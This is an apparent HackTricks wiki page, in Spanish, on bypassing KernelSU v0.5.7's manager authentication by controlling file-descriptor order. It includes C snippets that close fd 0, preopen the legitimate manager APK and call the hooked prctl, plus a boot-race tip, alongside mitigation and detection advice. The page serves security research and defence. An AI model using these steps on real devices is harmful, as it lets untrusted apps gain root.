# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Los frameworks de rooting como KernelSU, APatch, SKRoot y Magisk parchean frecuentemente el kernel de Linux/Android y exponen funcionalidades privilegiadas a una aplicación "manager" de espacio de usuario no privilegiado a través de una syscall enganchada. Si el paso de autenticación del manager es defectuoso, cualquier aplicación local puede acceder a este canal y escalar privilegios en dispositivos ya rooteados.

Esta página abstrae las técnicas y trampas descubiertas en investigaciones públicas (notablemente el análisis de Zimperium de KernelSU v0.5.7) para ayudar tanto a equipos rojos como azules a entender las superficies de ataque, los primitivos de explotación y las mitigaciones robustas.

---
## Patrón de arquitectura: canal de manager enganchado a syscall

- El módulo/parche del kernel engancha una syscall (comúnmente prctl) para recibir "comandos" del espacio de usuario.
- El protocolo típicamente es: magic_value, command_id, arg_ptr/len ...
- Una aplicación manager de espacio de usuario se autentica primero (por ejemplo, CMD_BECOME_MANAGER). Una vez que el kernel marca al llamador como un manager de confianza, se aceptan comandos privilegiados:
- Conceder root al llamador (por ejemplo, CMD_GRANT_ROOT)
- Gestionar listas de permitidos/prohibidos para su
- Ajustar la política de SELinux (por ejemplo, CMD_SET_SEPOLICY)
- Consultar versión/configuración
- Debido a que cualquier aplicación puede invocar syscalls, la corrección de la autenticación del manager es crítica.

Ejemplo (diseño de KernelSU):
- Syscall enganchada: prctl
- Valor mágico para desviar al controlador de KernelSU: 0xDEADBEEF
- Los comandos incluyen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Flujo de autenticación de KernelSU v0.5.7 (como se implementó)

Cuando el espacio de usuario llama a prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:

1) Verificación de prefijo de ruta
- La ruta proporcionada debe comenzar con un prefijo esperado para el UID del llamador, por ejemplo, /data/data/<pkg> o /data/user/<id>/<pkg>.
- Referencia: core_hook.c (v0.5.7) lógica de prefijo de ruta.

2) Verificación de propiedad
- La ruta debe ser propiedad del UID del llamador.
- Referencia: core_hook.c (v0.5.7) lógica de propiedad.

3) Verificación de firma de APK a través de escaneo de tabla de FD
- Iterar los descriptores de archivo abiertos (FDs) del proceso que llama.
- Elegir el primer archivo cuya ruta coincida con /data/app/*/base.apk.
- Analizar la firma de APK v2 y verificar contra el certificado oficial del manager.
- Referencias: manager.c (iterando FDs), apk_sign.c (verificación de APK v2).

Si todas las verificaciones pasan, el kernel almacena en caché temporalmente el UID del manager y acepta comandos privilegiados de ese UID hasta que se reinicie.

---
## Clase de vulnerabilidad: confiar en "el primer APK coincidente" de la iteración de FD

Si la verificación de firma se vincula a "el primer /data/app/*/base.apk coincidente" encontrado en la tabla de FD del proceso, en realidad no está verificando el paquete propio del llamador. Un atacante puede preposicionar un APK firmado legítimamente (el del verdadero manager) para que aparezca antes en la lista de FD que su propio base.apk.

Esta confianza por indirección permite que una aplicación no privilegiada se haga pasar por el manager sin poseer la clave de firma del manager.

Propiedades clave explotadas:
- El escaneo de FD no se vincula a la identidad del paquete del llamador; solo coincide patrones de cadenas de ruta.
- open() devuelve el FD disponible más bajo. Al cerrar primero los FDs de menor número, un atacante puede controlar el orden.
- El filtro solo verifica que la ruta coincida con /data/app/*/base.apk – no que corresponda al paquete instalado del llamador.

---
## Precondiciones de ataque

- El dispositivo ya está rooteado con un framework de rooting vulnerable (por ejemplo, KernelSU v0.5.7).
- El atacante puede ejecutar código arbitrario no privilegiado localmente (proceso de aplicación de Android).
- El verdadero manager aún no se ha autenticado (por ejemplo, justo después de un reinicio). Algunos frameworks almacenan en caché el UID del manager después del éxito; debes ganar la carrera.

---
## Esquema de explotación (KernelSU v0.5.7)

Pasos de alto nivel:
1) Construir una ruta válida a tu propio directorio de datos de aplicación para satisfacer las verificaciones de prefijo y propiedad.
2) Asegurarte de que un base.apk genuino de KernelSU Manager esté abierto en un FD de menor número que tu propio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para pasar las verificaciones.
4) Emitir comandos privilegiados como CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY para persistir la elevación.

Notas prácticas sobre el paso 2 (orden de FD):
- Identificar el FD de tu proceso para tu propio /data/app/*/base.apk caminando por los enlaces simbólicos de /proc/self/fd.
- Cerrar un FD bajo (por ejemplo, stdin, fd 0) y abrir primero el APK legítimo del manager para que ocupe el fd 0 (o cualquier índice inferior al fd de tu propio base.apk).
- Agrupar el APK legítimo del manager con tu aplicación para que su ruta satisfaga el filtro ingenuo del kernel. Por ejemplo, colócalo bajo una subruta que coincida con /data/app/*/base.apk.

Ejemplos de fragmentos de código (Android/Linux, solo ilustrativos):

Enumerar FDs abiertos para localizar entradas de base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forzar un FD de menor número a apuntar a la APK del administrador legítimo:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticación del administrador a través del gancho prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Después del éxito, comandos privilegiados (ejemplos):
- CMD_GRANT_ROOT: promover el proceso actual a root
- CMD_ALLOW_SU: agregar tu paquete/UID a la lista de permitidos para su persistente
- CMD_SET_SEPOLICY: ajustar la política de SELinux según lo soportado por el marco

Consejo de carrera/persistencia:
- Registra un receptor de BOOT_COMPLETED en AndroidManifest (RECEIVE_BOOT_COMPLETED) para iniciar temprano después del reinicio e intentar la autenticación antes del verdadero administrador.

---
## Orientación sobre detección y mitigación

Para desarrolladores de marcos:
- Vincula la autenticación al paquete/UID del llamador, no a FDs arbitrarios:
- Resuelve el paquete del llamador a partir de su UID y verifica contra la firma del paquete instalado (a través de PackageManager) en lugar de escanear FDs.
- Si es solo kernel, usa una identidad de llamador estable (credenciales de tarea) y valida en una fuente de verdad estable gestionada por init/ayudante de espacio de usuario, no FDs de proceso.
- Evita las verificaciones de prefijo de ruta como identidad; son trivialmente satisfacibles por el llamador.
- Usa un desafío-respuesta basado en nonce a través del canal y borra cualquier identidad de administrador en caché al inicio o en eventos clave.
- Considera IPC autenticado basado en binder en lugar de sobrecargar syscalls genéricos cuando sea posible.

Para defensores/equipo azul:
- Detecta la presencia de marcos de rooting y procesos de administrador; monitorea las llamadas prctl con constantes mágicas sospechosas (por ejemplo, 0xDEADBEEF) si tienes telemetría de kernel.
- En flotas gestionadas, bloquea o alerta sobre receptores de arranque de paquetes no confiables que intenten rápidamente comandos privilegiados de administrador después del arranque.
- Asegúrate de que los dispositivos estén actualizados a versiones de marco parcheadas; invalida los IDs de administrador en caché en la actualización.

Limitaciones del ataque:
- Solo afecta a dispositivos ya rooteados con un marco vulnerable.
- Típicamente requiere una ventana de reinicio/carrera antes de que el administrador legítimo se autentique (algunos marcos almacenan en caché el UID del administrador hasta que se reinicia).

---
## Notas relacionadas entre marcos

- La autenticación basada en contraseña (por ejemplo, versiones históricas de APatch/SKRoot) puede ser débil si las contraseñas son adivinables/brute forceables o si las validaciones tienen errores.
- La autenticación basada en paquete/firma (por ejemplo, KernelSU) es más fuerte en principio, pero debe vincularse al llamador real, no a artefactos indirectos como escaneos de FD.
- Magisk: CVE-2024-48336 (MagiskEoP) mostró que incluso ecosistemas maduros pueden ser susceptibles a la suplantación de identidad que lleva a la ejecución de código con root dentro del contexto del administrador.

---
## Referencias

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
